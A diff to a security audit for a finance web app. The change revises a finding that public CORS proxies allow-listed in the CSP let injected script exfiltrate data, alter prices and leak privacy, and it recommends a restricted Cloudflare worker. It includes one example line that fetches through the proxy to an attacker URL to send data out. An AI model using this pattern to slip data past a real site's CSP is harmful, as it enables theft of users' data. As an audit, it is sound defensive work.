@@ -15,7 +15,7 @@ server of our own. The realistic attackers are:
 
 1. **A malicious website** trying to exfiltrate data from or act on the app (XSS, clickjacking,
    dev-server abuse).
-2. **The third-party services** the app talks to (corsproxy.io, Yahoo via the proxy,
+2. **The third-party services** the app talks to (the public CORS proxies, Yahoo via them,
    financialmodelingprep.com) — they see traffic and control responses.
 3. **Someone with the public anon key** (it ships in the JS bundle by design) abusing the
    Supabase project.
@@ -25,27 +25,35 @@ server of our own. The realistic attackers are:
 
 ## Findings
 
-### HIGH — corsproxy.io is an allow-listed open proxy (integrity + privacy + CSP bypass)
+### HIGH — the public CORS proxies are allow-listed open proxies (integrity + privacy + CSP bypass)
 
-`src/lib/quotes.ts` routes all Yahoo Finance traffic through `https://corsproxy.io/?url=`,
-and `index.html`'s CSP allow-lists it in `connect-src`. Three consequences:
+`src/lib/quotes.ts` routes all Yahoo Finance traffic through a chain of public CORS proxies
+(`src/lib/proxies.ts`), and `index.html`'s CSP allow-lists every one of their origins in
+`connect-src`. Three consequences:
 
 - **CSP exfiltration bypass.** The CSP's main job in a finance app is stopping injected code
-  from phoning home. But corsproxy.io forwards to *any* URL, so any script that ever runs in
-  the page can `fetch('https://corsproxy.io/?url=' + attackerURL)` and ship your data out
-  through the allow-listed hole. The lock on the front door has a doggy-door in it.
+  from phoning home. But an open proxy forwards to *any* URL, so any script that ever runs in
+  the page can `fetch('<proxy>?url=' + attackerURL)` and ship your data out through the
+  allow-listed hole. The lock on the front door has a doggy-door in it.
 - **Price integrity.** The proxy sees and can rewrite every quote. Fake prices could
   misrepresent your portfolio value.
 - **Privacy.** Your IP + every ticker you hold or watch goes to an unvetted third party.
 
-**Fix path (plumbing shipped in v1.9.0 — one 5-minute manual step left):** the repo now
+**Scope note (v1.15.0):** the default is now a *failover chain* rather than a single proxy,
+because free proxies disappear without notice — corsproxy.io began demanding an API key and
+returned HTTP 401 to every request, which broke live prices outright. Failing over restores
+availability but *widens* this finding: the CSP must allow-list several origins instead of
+one, so there are now several doggy-doors. That is the trade the default accepts; the fix
+below closes all of them at once.
+
+**Fix path (plumbing shipped in v1.9.0 — one 5-minute manual step left):** the repo
 ships a ready-to-deploy worker at `proxy/cloudflare-worker.js` that only forwards to
 Yahoo's quote hosts and only answers your app's origins. Deploy it (Cloudflare free tier),
 then set the repo Actions **variable** `VITE_QUOTES_PROXY` to
 `https://<your-worker>/?url=` — full steps in DEPLOY.md Part 3. The build then routes all
-quotes through your worker AND swaps corsproxy.io out of the CSP automatically
-(`vite.config.ts` `cspQuotesProxy`); verified both ways in the built output. Until the
-variable is set, the app falls back to corsproxy.io and this finding remains open.
+quotes through your worker alone (the public chain is not consulted at all) AND narrows the
+CSP `connect-src` to your worker's origin (`vite.config.ts` `cspQuotesProxy`). Until the
+variable is set, the app uses the public chain and this finding remains open.
 
 ### HIGH — Supabase project accepts open sign-ups with weak defaults
 
@@ -110,7 +118,7 @@ are rejected. The import reports how many rows were skipped.
 The Supabase session token persists in `localStorage`, readable by any script that executes
 in the origin. This is the standard supabase-js SPA model; the real defense is the strict
 `script-src 'self'` CSP plus zero third-party scripts, which this app already has. Revisit
-only if the app ever loads external scripts. (Closing the corsproxy hole above is what makes
+only if the app ever loads external scripts. (Closing the open-proxy hole above is what makes
 the CSP actually airtight.)
 
 ### LOW — watchlist/holdings tickers leak to third parties by design
